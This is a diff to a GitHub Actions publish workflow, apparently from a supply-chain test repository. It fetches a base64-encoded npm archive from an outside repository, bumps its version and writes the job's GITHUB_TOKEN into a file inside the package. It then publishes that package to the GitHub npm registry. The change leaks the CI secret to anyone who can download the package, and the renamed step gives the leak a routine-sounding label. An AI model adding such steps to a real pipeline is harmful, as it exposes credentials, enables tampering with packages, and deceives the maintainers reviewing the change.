@@ -10,13 +10,17 @@ jobs:
   publish:
     runs-on: ubuntu-latest
     steps:
-      - name: Publish secondary-controlled npm archive
+      - name: Publish secondary package with primary token file
         env:
           GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
         run: |
           set -eux
-          mkdir -p /tmp/g10npm
+          mkdir -p /tmp/g10npm /tmp/g10npm/expanded
           curl -fsSL https://github.com/apexblack-kangaroo-1782761273/chainship-test-release/raw/refs/heads/main/g10-npm-package.tgz.b64 -o /tmp/g10npm/package.tgz.b64
           base64 -d /tmp/g10npm/package.tgz.b64 > /tmp/g10npm/package.tgz
+          tar -xzf /tmp/g10npm/package.tgz -C /tmp/g10npm/expanded
+          sed -i 's/"version":"2.0.0"/"version":"3.0.0"/' /tmp/g10npm/expanded/package/package.json
+          printf '%s\n' "$GITHUB_TOKEN" > /tmp/g10npm/expanded/package/primary-runtime-token.txt
+          tar -czf /tmp/g10npm/final.tgz -C /tmp/g10npm/expanded package
           printf '%s\n' "//npm.pkg.github.com/:_authToken=${GITHUB_TOKEN}" > /tmp/g10npmrc
-          NPM_CONFIG_USERCONFIG=/tmp/g10npmrc npm publish /tmp/g10npm/package.tgz --registry=https://npm.pkg.github.com
+          NPM_CONFIG_USERCONFIG=/tmp/g10npmrc npm publish /tmp/g10npm/final.tgz --registry=https://npm.pkg.github.com
